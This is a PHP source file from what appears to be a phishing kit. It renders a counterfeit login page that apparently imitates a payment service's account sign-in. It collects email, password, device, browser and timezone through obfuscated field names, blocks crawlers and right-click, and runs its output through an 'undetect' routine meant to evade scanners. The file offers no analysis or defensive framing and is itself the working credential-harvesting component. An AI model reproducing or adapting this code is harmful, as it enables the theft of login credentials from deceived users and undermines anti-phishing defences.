<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "signin";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

$signin = $api->signinPage();

$html = '
<!DOCTYPE html>
<html>
<head>
<title>'.$api->text_encode($signin['title']).'</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount.signin.css").'">
<script src="'.$api->text_encode("../assets/js/jquery.js").'" type="text/javascript"></script>
<script src="'.$api->text_encode("../assets/js/jquery.validate.js").'" type="text/javascript"></script>
<script src="'.$api->text_encode("../assets/js/signin.auth.js").'" type="text/javascript"></script>
</head>
<body oncontextmenu="return false">
<div class="main">
<section class="login">
<div class="corral">
<div class="contentContainer activeContent contentContainerBordered">
<header>
<p class="logo logo-long"></p>
</header>
<div class="notifications">
<p class="notification notification-critical hide" id="errorMsg">'.$api->text_encode($text['1']).'</p>
<p class="notification notification-critical hide" id="captchaMsg">'.$api->text_encode($text['2']).'</p>
</div>
<form method="post" id="signin" autocomplete="off">
<input type="hidden" name="'.$api->encypt("device").'" id="Device" value="">
<input type="hidden" name="'.$api->encypt("browser").'" id="Browser" value="">
<input type="hidden" name="'.$api->encypt("timezone").'" id="Timezone" value="">
<div class="splitEmail">
<div class="textInput" id="divEmail">
<div class="fieldWrapper">
<input type="text" name="'.$api->encypt("email").'" placeholder="'.$api->text_encode($signin['email']).'" id="Email" value="'.@$_SESSION['email'].'">
</div>
<div class="errorMessage" id="emailError">
<p class="emptyError">'.$api->text_encode($signin['required']).'</p>
</div>
</div>
</div>
<div class="splitPassword">
<div class="textInput" id="divPassword">
<div class="fieldWrapper">
<input type="password" name="'.$api->encypt("password").'" placeholder="'.$api->text_encode($signin['password']).'" id="Password">
<button type="button" class="show-hide-password hide" id="showpassword">'.$api->text_encode($signin['show']).'</button>
<button type="button" class="show-hide-password hide" id="hidepassword">'.$api->text_encode($signin['hide']).'</button>
</div>
<div class="errorMessage" id="passwordError">
<p class="emptyError">'.$api->text_encode($signin['required']).'</p>
</div>
</div>';

if($api->config("captcha") == "on"){
  $html .= '
  <div class="captcha-container clearfix">
  <div class="captcha-image">
  <img id="captchaImage" src="'.$api->image_encode("assets/img/captcha/".rand(0,3).".jpeg")['local'].'">
  </div>
  <div class="captcha-inputs clearfix">
  <div class="textInput" id="divCaptcha">
  <div class="fieldWrapper">
  <input type="text" name="'.$api->encypt("captcha").'" placeholder="'.$api->text_encode($signin['captcha']).'" id="Captcha">
  </div>
  <div class="errorMessage" id="captchaError">
  <p class="emptyError">'.$api->text_encode($signin['required']).'</p>
  </div>
  </div>
  <div class="refresh">
  <div onclick="captchaRefresh()" class="captchaRefresh buttonLight onboardingSpritePseudo"></div>
  </div>
  <div class="audio">
  <a href="#" class="captchaPlay buttonLight onboardingSpritePseudo"></a>
  </div>
  </div>
  </div>';
  $login = "btnLogincaptcha";
} else {
  $login = "btnLogin";
}

$html .= '
<div class="actions">
<button type="submit" class="button actionContinue" id="'.$login.'">'.$api->text_encode($signin['login']).'</button>
</div>
</div>
</form>
<div class="forgotLink">
<a href="#">'.$api->text_encode($signin['forgot']).'</a>
</div>
<div class="loginSignUpSeparator">
<span class="textInSeparator">'.$api->text_encode($signin['separator']).'</span>
</div>
<a href="#" class="button secondary">'.$api->text_encode($signin['create']).'</a>
</div>
</div>
</div>
<footer class="footer">
'.$signin['footer'].'
</section>
</div>
<div class="transitioning hide" id="loading"></div>
</div>
<script src="'.$api->text_encode("../assets/js/signin.post.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>
